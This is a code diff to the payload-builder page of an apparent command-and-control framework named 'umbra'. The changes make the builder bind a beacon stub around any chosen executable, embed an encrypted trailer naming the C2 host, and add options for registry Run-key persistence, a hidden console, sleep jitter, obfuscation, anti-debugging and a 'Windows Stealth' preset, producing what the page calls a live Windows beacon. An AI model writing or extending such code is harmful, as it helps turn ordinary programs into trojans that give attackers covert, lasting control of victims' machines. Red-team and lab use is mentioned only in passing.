@@ -12,7 +12,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@
 import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/Tabs'
 import { cn } from '@/lib/utils'
 import type { PayloadConfig, BuildResult } from '@/types'
-import { wrapAgentBinary, sha256Hex } from '@/lib/payloadWrap'
+import { wrapAgentBinary, sha256Hex, loadStubBinary, decryptTrailerJSON } from '@/lib/payloadWrap'
 import {
   Box,
   Download,
@@ -48,14 +48,18 @@ const defaultConfig: PayloadConfig = {
   Platform: 'windows',
   Arch: 'x64',
   Obfuscation: true,
-  AntiDebug: true,
-  AntiVM: true,
+  AntiDebug: false,
+  AntiVM: false,
   SleepObfuscation: true,
   EncryptedComms: true,
   ProcessInjection: false,
   InjectionMethod: 'none',
   EncryptionKey: '',
   CustomConfig: '',
+  Persistence: false,
+  HideConsole: true,
+  SleepInterval: 15,
+  Jitter: 20,
 }
 
 export function PayloadBuilderPage() {
@@ -74,12 +78,6 @@ export function PayloadBuilderPage() {
       .join('')
 
   const handleBuild = async () => {
-    if (!agentFile) {
-      toast.error('Build failed', {
-        description: 'Pick a compiled agent in Advanced, then Build. Wrapping is local — the exe never uploads.',
-      })
-      return
-    }
     setBuilding(true)
     setResult(null)
     try {
@@ -88,9 +86,14 @@ export function PayloadBuilderPage() {
         cfg = { ...cfg, EncryptionKey: randomKey() }
         setConfig(cfg)
       }
-      const exe = await agentFile.arrayBuffer()
-      const { bytes } = await wrapAgentBinary(exe, cfg)
-      const name = cfg.Platform === 'linux' ? 'umbra-linux' : (agentFile.name || 'umbra-windows.exe')
+      const stub = await loadStubBinary()
+      const carrier = agentFile ? await agentFile.arrayBuffer() : null
+      const { bytes } = await wrapAgentBinary(carrier, stub, cfg)
+      const check = decryptTrailerJSON(bytes)
+      if (!check || !check.includes(`"c2_host":"${cfg.ServerHost}"`)) {
+        throw new Error('trailer verify failed — stub wrap did not land')
+      }
+      const name = cfg.Platform === 'linux' ? 'umbra-linux' : (agentFile?.name ? `umbra-${agentFile.name}` : 'umbra-windows.exe')
       const blob = new Blob([bytes], { type: 'application/octet-stream' })
       const url = URL.createObjectURL(blob)
       const a = document.createElement('a')
@@ -111,7 +114,7 @@ export function PayloadBuilderPage() {
       }
       setResult(buildResult)
       toast.success('Payload built', {
-        description: `${name} (${(bytes.length / 1024).toFixed(1)} KB) — trailer written, file downloaded`,
+        description: `${name} (${(bytes.length / 1024).toFixed(1)} KB) — stub + ${agentFile ? 'your file' : 'beacon only'} + trailer. Run in the VM.`,
       })
     } catch (error) {
       toast.error('Build failed', {
@@ -382,6 +385,19 @@ export function PayloadBuilderPage() {
                     </div>
                     <div className="flex items-center justify-between">
                       <div className="flex items-center gap-3">
+                        <Save className="w-5 h-5 text-accent-400" />
+                        <div>
+                          <p className="font-medium text-dark-100">Persistence</p>
+                          <p className="text-sm text-dark-500">HKCU Run key — survives reboot</p>
+                        </div>
+                      </div>
+                      <Switch
+                        checked={config.Persistence}
+                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, Persistence: checked }))}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
                         <Lock className="w-5 h-5 text-accent-400" />
                         <div>
                           <p className="font-medium text-dark-100">Encrypted Communications</p>
@@ -567,7 +583,7 @@ export function PayloadBuilderPage() {
                   <Download className="w-5 h-5 text-accent-400" />
                   Custom Agent Binary Upload
                 </CardTitle>
-                <CardDescription>Upload your own compiled agent binaries</CardDescription>
+                <CardDescription>Optional. Your file is bound into the stub and launched after the beacon registers. Build works with no file — stub only.</CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
@@ -580,7 +596,7 @@ export function PayloadBuilderPage() {
                       className="bg-dark-900 border-dark-700"
                     />
                     <p className="text-xs text-dark-500">
-                      {agentFileLabel || 'Compile agent/agent.cpp in the VM (compile_vm.bat). Wrap that exe — not the 39MB data/files/agent.exe. That binary never reads the trailer.'}
+                      {agentFileLabel || 'Pick any .exe. Build wraps the baked stub around it. Leave empty to download a beacon-only payload.'}
                     </p>
                   </div>
                   <div className="space-y-4">
@@ -612,7 +628,7 @@ export function PayloadBuilderPage() {
               <Zap className="w-5 h-5 text-accent-400" />
               Build Payload
             </CardTitle>
-            <CardDescription>Compile the agent with your configuration</CardDescription>
+            <CardDescription>Downloads a live Windows beacon pointed at this C2. Optional file is launched after check-in.</CardDescription>
           </CardHeader>
           <CardContent className="space-y-4">
             <div className="flex flex-col sm:flex-row gap-4">
@@ -696,7 +712,7 @@ export function PayloadBuilderPage() {
             <div className="pt-4 border-t border-dark-700">
               <p className="text-sm text-dark-400 mb-3">Quick Presets</p>
               <div className="flex flex-wrap gap-2">
-                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x64', AntiDebug: true, AntiVM: true, Obfuscation: true, SleepObfuscation: true }))}>
+                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x64', AntiDebug: true, AntiVM: false, Obfuscation: true, SleepObfuscation: true }))}>
                   <Shield className="w-3 h-3 mr-1" />
                   Windows Stealth
                 </Button>
